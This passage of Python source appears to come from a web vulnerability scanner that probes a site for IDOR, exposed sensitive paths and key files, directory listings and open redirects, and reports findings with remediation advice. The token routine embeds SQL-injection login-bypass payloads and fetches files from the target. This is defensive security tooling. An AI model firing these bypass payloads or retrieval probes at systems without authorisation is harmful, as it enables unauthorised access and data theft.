        resp = _send("POST", url, body, "application/json", cookies=cookies)
        if int(resp.get("status") or 0) not in (200, 201):
            continue
        token = _idor_token_from(_idor_parse_json(resp.get("body") or ""))
        if token:
            return token
    return ""


def _idor_obtain_token(origin: str, cookies, artefact) -> str:
    token = _idor_token_from_cookies(cookies)
    if token:
        return token
    art_body = ""
    if isinstance(artefact, dict):
        art_body = str(artefact.get("body") or "")
        token = _idor_token_from(_idor_parse_json(art_body))
        if token:
            return token
    for field in ("email", "username"):
        for taut in ("' OR true-- ", "' OR '1'='1'-- ", "' OR 1=1-- ", "' OR true--", "' OR '1'='1'--"):
            token = _idor_try_login(origin, cookies, {field: taut, "password": "webset"})
            if token:
                return token
    nonce = str(abs(hash((origin, art_body[:40]))) % 10 ** 10)
    email = "webset" + nonce + "@example.com"
    password = "WebsetPass1!"
    register_body = json.dumps({
        "email": email,
        "password": password,
        "username": "webset" + nonce,
        "user": email,
    })
    for path in _IDOR_REGISTER_PATHS:
        url = urljoin(origin + "/", path.lstrip("/"))
        resp = _send("POST", url, register_body, "application/json", cookies=cookies)
        if int(resp.get("status") or 0) not in (200, 201):
            continue
        token = _idor_token_from(_idor_parse_json(resp.get("body") or ""))
        if token:
            return token
        token = _idor_try_login(origin, cookies, {"email": email, "password": password})
        if token:
            return token
        token = _idor_try_login(origin, cookies, {"username": email, "password": password})
        if token:
            return token
    return ""


def _idor_candidate_urls(origin: str, artefact, start: str) -> list[str]:
    urls = []
    seen = set()

    def add(path_or_url: str):
        raw = (path_or_url or "").strip()
        if not raw:
            return
        if raw.startswith("http://") or raw.startswith("https://"):
            url = raw
        else:
            url = urljoin(origin + "/", raw.lstrip("/"))
        if not _allowed(url, start):
            return
        key = urlparse(url).path.rstrip("/") or "/"
        if key in seen:
            return
        seen.add(key)
        urls.append(url)

    for path in _idor_collection_paths():
        add(path)
    body = ""
    if isinstance(artefact, dict):
        body = str(artefact.get("body") or "")
    for raw in _API_ROUTE_RE.findall(body or ""):
        path = raw if isinstance(raw, str) else raw[0]
        low = str(path).lower()
        if any(tok in low for tok in _IDOR_RESOURCE):
            add(path)
    def _score(u: str) -> tuple:
        p = urlparse(u).path.lower()
        api = 0
        if p.startswith("/api/") or p.startswith("/rest/"):
            api = 2
        elif "/api/" in p or "/rest/" in p:
            api = 1
        user = 1 if "user" in p else 0
        return (-api, -user, len(p), p)
    urls.sort(key=_score)
    return urls[:24]


def _surface_idor(origin: str, cookies=None, artefact=None, start: str = "") -> list[dict]:
    if not origin:
        return []
    start = start or origin
    token = _idor_obtain_token(origin, cookies, artefact)
    auth = _idor_auth_headers(token)
    for url in _idor_candidate_urls(origin, artefact, start):
        probes = [(cookies, None, "session cookies only")]
        if auth:
            probes.append((cookies, auth, "authenticated bearer token"))
        for jar, headers, how in probes:
            hdrs = dict(headers or {})
            hdrs["Accept"] = "application/json"
            resp = _send("GET", url, cookies=jar, extra_headers=hdrs)
            if int(resp.get("status") or 0) != 200:
                continue
            hit, evidence = _idor_user_dump(str(resp.get("body") or ""))
            if not hit:
                continue
            item = build_injection_finding(
                severity="High",
                vulnerability="Insecure Direct Object Reference",
                url=url,
                description=(
                    f"{url} returned records for more than one user identity "
                    f"({how}). The response includes identifiers such as email "
                    "or username for other principals, so a caller can read "
                    "accounts they do not own."
                ),
                remediation=(
                    "Authorise collection and object reads per principal: a "
                    "user may receive only their own record unless they have "
                    "an explicit admin role. Enforce this on the server with "
                    "object-level checks, not by hiding the route in the UI. "
                    "Return 403 for unauthorised ids and never dump the full "
                    "user table to a standard session."
                ),
                vuln_type="idor",
                param="Authorization",
                cwe_id="CWE-639",
                wasc_id="WASC-02",
                owasp="A01:2025 Broken Access Control",
                nist="NIST SP 800-53 Rev. 5 AC-3 / AC-6",
                sans="CWE Top 25 (2024) #1 — CWE-284",
                method="GET",
                param_location="header",
                context="header",
                scan_origin="Dynamic",
                plugin_id="idor-bola",
                evidence=evidence or "JSON collection contained multiple user identities",
            )
            if item:
                return [item]
    return []


def run_generic_surface_checks(ctx, artefact: dict | None = None) -> list[dict]:
    started = time.time()
    start = getattr(ctx, "requested_url", None) or getattr(ctx, "url", None) or ""
    origin = _origin(start)
    if not origin:
        return []
    findings: list[dict] = []
    cookies = _cookies_from(ctx, artefact)
    def _budget():
        return (time.time() - started) < _SURFACE_BUDGET_SEC
    art_body = str((artefact or {}).get("body") or "")
    if _site_root(start):
        home = _send("GET", origin + "/", cookies=cookies)
        home_body = home.get("body") or "" if home.get("ok") else art_body
    else:
        home_body = art_body
    probed = set()
    if _site_root(start):
        for path, needles in _SENSITIVE_PATHS:
            if not _budget():
                break
            url = urljoin(origin + "/", path.lstrip("/"))
            probed.add(urlparse(url).path.rstrip("/") or "/")
            if not _allowed(url, start):
                continue
            resp = _send("GET", url, cookies=cookies)
            if not resp.get("ok") or int(resp.get("status") or 0) != 200:
                continue
            body = resp.get("body") or ""
            text = body.lower()
            if _same_as_home(body, home_body):
                continue
            listing = path.rstrip("/") in {p.rstrip("/") for p in _LISTING_PATHS} and _looks_like_listing(body)
            needle_hit = bool(needles) and any(n in text for n in needles)
            if listing:
                findings.append(
                    build_passive_rule_finding(
                        "dir-listing",
                        location=url,
                        scan_origin="Dynamic",
                        evidence=f"directory index at {path}",
                    )
                )
                for file_url in _listed_files(origin, url, body, start):
                    file_resp = _send("GET", file_url, cookies=cookies)
                    if int(file_resp.get("status") or 0) != 200:
                        continue
                    fbody = file_resp.get("body") or ""
                    if _same_as_home(fbody, home_body):
                        continue
                    low = fbody.lower()
                    rule_id = (
                        "exposed-key-material"
                        if any(sig in low for sig in _KEY_SIGNS)
                        else "sensitive-file"
                    )
                    findings.append(
                        build_passive_rule_finding(
                            rule_id,
                            location=file_url,
                            scan_origin="Dynamic",
                            evidence=f"listed file retrieved HTTP {file_resp.get('status')}",
                        )
                    )
                continue
            if needle_hit or (not needles and int(resp.get("status") or 0) == 200 and len(body) > 40):
                if needles and needle_hit:
                    findings.append(
                        build_passive_rule_finding(
                            "sensitive-path",
                            location=url,
                            scan_origin="Dynamic",
                            evidence=f"diagnostic path {path} returned HTTP 200",
                        )
                    )
                elif not needles and listing is False and len(body) > 40:
                    findings.append(
                        build_passive_rule_finding(
                            "sensitive-path",
                            location=url,
                            scan_origin="Dynamic",
                            evidence=f"path {path} returned HTTP 200",
                        )
                    )
        for path in _KEY_PATHS:
            if not _budget():
                break
            url = urljoin(origin + "/", path.lstrip("/"))
            probed.add(urlparse(url).path.rstrip("/") or "/")
            if not _allowed(url, start):
                continue
            resp = _send("GET", url, cookies=cookies)
            if not resp.get("ok") or int(resp.get("status") or 0) != 200:
                continue
            body = resp.get("body") or ""
            if _same_as_home(body, home_body):
                continue
            low = body.lower()
            if any(sig in low for sig in _KEY_SIGNS) or path.endswith((".pem", ".pub", ".key", ".crt")):
                findings.append(
                    build_passive_rule_finding(
                        "exposed-key-material",
                        location=url,
                        scan_origin="Dynamic",
                        evidence="key or JWKS document retrieved without authentication",
                    )
                )
        for path in _SIGNATURE_PATHS:
            if not _budget():
                break
            url = urljoin(origin + "/", str(path).lstrip("/"))
            key = urlparse(url).path.rstrip("/") or "/"
            if key in probed:
                continue
            probed.add(key)
            if not _allowed(url, start):
                continue
            resp = _send("GET", url, cookies=cookies)
            if not resp.get("ok") or int(resp.get("status") or 0) != 200:
                continue
            body = resp.get("body") or ""
            if _same_as_home(body, home_body):
                continue
            if _looks_like_listing(body):
                findings.append(
                    build_passive_rule_finding(
                        "dir-listing",
                        location=url,
                        scan_origin="Dynamic",
                        evidence=f"directory index at {path}",
                    )
                )
                continue
            if len(body) > 40:
                findings.append(
                    build_passive_rule_finding(
                        "sensitive-path",
                        location=url,
                        scan_origin="Dynamic",
                        evidence=f"path {path} returned HTTP 200",
                    )
                )
    found_redirect = False
    page_params = _page_params(start)
    for name in _REDIRECT_PARAMS:
        if name not in {k.lower() for k in page_params}:
            continue
        parsed = urlparse(start)
        q = dict(parse_qsl(parsed.query, keep_blank_values=True))
        q[name] = "https://example.com"
        probe_url = urlunparse(
            (parsed.scheme, parsed.netloc, parsed.path or "/", "", urlencode(q), "")
        )
        if not _allowed(probe_url.split("?")[0], start):
            continue
        redir = _send("GET", probe_url, cookies=cookies)
        loc = (redir.get("headers") or {}).get("location", "")
        if "example.com" in loc.lower():
            _add_redirect_finding(findings, probe_url.split("?")[0], name, loc)
            found_redirect = True
            break
    if not found_redirect and _site_root(start):
        for path in _REDIRECT_PATHS:
            for name in ("to", "url", "next", "redirect"):
                probe_url = urljoin(
                    origin + "/", f"{path.lstrip('/')}?{name}=https://example.com"
                )
                if not _allowed(probe_url.split("?")[0], start):
                    continue
                redir = _send("GET", probe_url, cookies=cookies)
                loc = (redir.get("headers") or {}).get("location", "")
                if "example.com" in loc.lower():
                    _add_redirect_finding(findings, probe_url.split("?")[0], name, loc)
                    found_redirect = True
                    break
            if found_redirect:
                break
    if _budget():
        findings.extend(_probe_dom_xss(origin, start, cookies=cookies))
    findings.extend(_upload_surface(ctx, artefact))
    findings.extend(_csrf_surface(ctx, artefact))
    findings.extend(_weak_session_surface(ctx, artefact))
    if _site_root(start) and _budget():
        findings.extend(_surface_xxe(origin, cookies=cookies))
        findings.extend(_surface_sqli_auth(origin, cookies=cookies))
        findings.extend(_surface_nosql(origin, cookies=cookies))
        findings.extend(_surface_idor(origin, cookies=cookies, artefact=artefact, start=start))
    used = _ORIGIN_WIDE_TRIES.get(origin, 0) if origin else _MAX_WIDE_TRIES
    if origin and used < _MAX_WIDE_TRIES:
        _ORIGIN_WIDE_TRIES[origin] = used + 1
        findings.extend(_client_validation_surface(ctx, artefact))
    return findings
def run_lab_surface_checks(ctx, artefact: dict | None = None) -> list[dict]:
    return run_generic_surface_checks(ctx, artefact)
